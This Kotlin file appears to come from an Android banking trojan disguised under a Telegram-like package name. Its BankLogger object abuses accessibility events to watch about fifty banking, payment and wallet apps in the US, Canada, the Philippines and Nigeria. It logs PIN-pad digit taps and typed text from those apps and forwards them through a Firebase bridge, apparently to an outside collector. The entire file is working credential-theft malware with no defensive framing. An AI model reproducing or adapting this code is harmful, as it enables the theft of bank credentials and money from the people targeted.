package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

object BankLogger {
    private val bankPackages = setOf(
        "com.chase.sig.android", "com.wellsfargo.mobile", "com.bankofamerica.banking",
        "com.cibc.mobile", "com.td", "com.scotiabank.banking", "com.rbc.mobile",
        "com.capitalone.mobile", "com.paypal.android.p2pmobile", "com.venmo",
        "com.squareup.cash", "com.moneybookers.skrillpayments",
        "com.google.android.apps.walletnfcrel", "com.google.android.apps.nbu.paisa.user",
        "com.globe.gcash.android", "com.paymaya", "ph.seabank.seabank",
        "asia.coins.mobile", "com.grabtaxi.passenger", "com.shopee.ph",
        "ph.com.gotyme", "com.tonik.mobile", "com.iexceed.unoConsumerBanking",
        "com.uniondigitalbank", "com.ofbank.mobile",
        "ph.com.bdo.retail", "ph.com.bdo.pay", "ph.com.metrobank.mcc.mbonline",
        "com.unionbankph.online", "com.pnb.android", "com.landbank.mobilebanking",
        "com.securitybank.bbx", "com.eastwest.mobile.dxp", "com.rcbc.pulz",
        "com.maybank2u.mayaph", "com.bpi.ng.app", "ph.maya.business.android",
        "com.paymaya.negosyo", "team.opay.pay", "com.transsnet.palmpay",
        "com.mtngroupfintech.consumerapp", "com.africa.smartcash", "com.mypaga.customer",
        "ng.com.fairmoney.fairmoney", "com.kudabank.app", "com.moniepoint.personal",
        "com.moniepoint.business", "com.wemabank.alat.prod",
        "com.accessbank.nextgen", "com.gtbank.gtworldv1", "com.firstbank.firstmobile",
        "com.uba.vericash", "com.zenithBank.eazymoney"
    )

    fun onEvent(service: AccessibilityService, event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in bankPackages) return

        // Digit clicks on custom keyboards
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val source = event.source ?: return
            val text = getViewText(source)
            if (text != null && text.length == 1 && text[0].isDigit()) {
                FirebaseBridge.appendBankData("Digit: $text | App: $pkg")
            }
            source.recycle()
        }

        // Text field changes
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val source = event.source ?: return
            val newText = event.text?.joinToString(" ") ?: ""
            if (newText.isNotEmpty()) {
                FirebaseBridge.appendBankData("Text: $newText | App: $pkg")
            }
            source.recycle()
        }
    }

    private fun getViewText(node: AccessibilityNodeInfo): String? {
        if (node.text?.isNotEmpty() == true) return node.text.toString()
        if (node.contentDescription?.isNotEmpty() == true) return node.contentDescription.toString()
        return null
    }
}